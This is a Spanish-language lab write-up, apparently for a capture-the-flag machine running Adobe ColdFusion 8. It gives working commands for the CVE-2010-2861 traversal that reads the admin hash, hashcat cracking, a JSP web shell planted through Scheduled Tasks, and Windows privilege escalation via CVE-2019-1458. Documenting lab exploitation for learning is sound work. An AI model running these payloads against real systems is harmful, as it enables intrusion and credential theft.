Reconocimiento

1
ESCANEO (MÁQUINA LENTA)
NMAP
$ sudo nmap -p- -n -Pn -sS --min-rate 3000 --max-retries 1 10.129.5.209
135/tcp open msrpc
8500/tcp open fmtp JRun Web Server (Adobe ColdFusion 8)

// NOTA

Un 8500 con JRun/ColdFusion 8 es casi un cartel: ir directo a /CFIDE/administrator/enter.cfm. La máquina responde lento: conviene usar timeouts amplios (60–120 s) en cada petición.

// 02

Traversal y crackeo

2
LEER PASSWORD.PROPERTIES (CVE-2010-2861)
TRAVERSAL
$ UP=$(printf '../%.0s' $(seq 1 13))
$ curl -s "http://10.129.5.209:8500/CFIDE/administrator/enter.cfm?locale=${UP}ColdFusion8/lib/password.properties%00en"
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03

// CVE-2010-2861 — DIRECTORY TRAVERSAL

Dónde: el parámetro locale de enter.cfm, sin saneado.
Qué permite: leer cualquier fichero del sistema con permisos del proceso ColdFusion — incluido password.properties, con el hash SHA-1 del administrador.

3
ROMPER EL HASH
HASHCAT
$ hashcat -m 100 -a 0 /tmp/ar_hash.txt /usr/share/wordlists/rockyou.txt
happyday # admin:happyday

// 03

Panel y tarea programada

4
LOGIN CON HASH CALCULADO EN CLIENTE

El formulario de ColdFusion no envía la contraseña en claro: calcula hex_hmac_sha1(salt, hex_sha1(password)) con JavaScript antes de enviarlo. Hay que reproducir exactamente ese cálculo en Python.

PYTHON
# sha1.js del servidor define hexcase = 1 → el hash va en MAYÚSCULAS

// OJO

Con el hash en minúsculas el login siempre falla, sin ningún mensaje de error claro. El detalle de hexcase = 1 en sha1.js es el que lo explica.

5
TAREA PROGRAMADA: DESCARGAR Y PUBLICAR UN JSP

El panel autenticado permite crear una tarea (Scheduled Task) que pide una URL y, con publish=1 y publish_file, guarda la respuesta como archivo en una ruta del servidor — si esa ruta está dentro del webroot, el resultado es RCE.

SCHEDULED TASK
# publish="1" (no "on") y publish_file dentro del webroot CFIDE
RCE
$ curl 'http://10.129.5.209:8500/CFIDE/shell.jsp?c=whoami'
arctic\tolis

// ESCRITURA ARBITRARIA DE ARCHIVOS → RCE

Dónde: la función publish de las tareas programadas de ColdFusion.
Qué permite: escribir el resultado de una petición HTTP en cualquier ruta que el proceso pueda crear — si cae dentro del webroot y es un JSP, se ejecuta.

// OJO

El writeup de referencia usa MS10-059 (Chimichurri), pero el módulo no estaba disponible en esta Kali y MS16-032/MS16-075 ejecutaban sin elevar. CVE-2019-1458 (wizardopium) sí dio SYSTEM en este Server 2008 R2 x64. El panel también abre varias sesiones del mismo usuario: hay que entrar en la que devuelve NT AUTHORITY\SYSTEM, no en la primera.

// 05

Referencia Comandos

Directory traversal (locale)
enter.cfm?locale=../../../ruta/absoluta%00en
Explota CVE-2010-2861 para leer ficheros arbitrarios fuera del directorio esperado.
hashcat -m 100
hashcat -m 100 -a 0 hash.txt lista.txt
Modo de hashcat para SHA-1 sin sal, el formato del password.properties de ColdFusion.
Scheduled Tasks de ColdFusion
ScheduledURL + publish=1 + publish_file=<ruta>
Funcionalidad legítima del panel que descarga una URL y la guarda como archivo en el servidor — RCE si cae en el webroot.
cve_2019_1458_wizardopium
use exploit/windows/local/cve_2019_1458_wizardopium ; set SESSION N ; exploit
Módulo de escalada local de Metasploit para CVE-2019-1458, efectivo en Windows sin parches de 2019.

// 06

Glosario

Adobe ColdFusion
Plataforma de desarrollo web de Adobe con su propio lenguaje (CFML). La versión 8, sin soporte desde hace años, arrastra varias vulnerabilidades críticas conocidas.
CVE-2010-2861
Directory traversal en el administrador de ColdFusion a través del parámetro locale, que permite leer archivos arbitrarios del servidor, incluidos ficheros de credenciales.
hex_hmac_sha1 (login en cliente)
Esquema donde el formulario calcula un HMAC-SHA1 de la contraseña con un salt antes de enviarlo, en vez de mandar la contraseña en claro — hay que reproducir el cálculo exacto (mayúsculas/minúsculas incluidas) para automatizarlo.
Scheduled Task (publish)
Funcionalidad de ColdFusion para programar tareas que descargan una URL periódicamente. Su opción publish guarda la respuesta como archivo, lo que la convierte en una primitiva de escritura.
CVE-2019-1458 (wizardopium)
Vulnerabilidad de escalada de privilegios en el kernel de Windows (win32k.sys), corregida en diciembre de 2019, usada aquí para pasar de un usuario estándar a SYSTEM.
